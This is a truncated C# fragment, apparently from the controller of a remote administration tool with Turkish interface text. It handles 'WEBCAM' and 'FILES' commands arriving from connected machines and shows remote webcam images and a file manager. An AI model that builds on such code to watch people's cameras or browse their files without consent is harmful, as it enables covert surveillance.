                ...
                switch (s[0])
                {
                    ...
                    case "WEBCAM":
                        try
                        {
                            ...
                            var bt = new byte[int.Parse(regEx.Value)];
                            Receive(soket2, bt, 0, bt.Length, 59999);
                            byte[] decompressed = Decompress(bt);
                            FİndKameraById(soket2.Handle.ToString()).pictureBox1.Image = ByteToImage(decompressed);
                            FİndKameraById(soket2.Handle.ToString()).label2.Visible = false;
                        }
                        catch (Exception) {}
                        break;
                    case "FILES":
                        ...
                        Invoke((MethodInvoker)delegate {
                            ...
                            catch(Exception ex) { FindFileManagerById(soket2.Handle.ToString()).Text = "Dosya Yöneticisi - Hata: " + ex.Message;
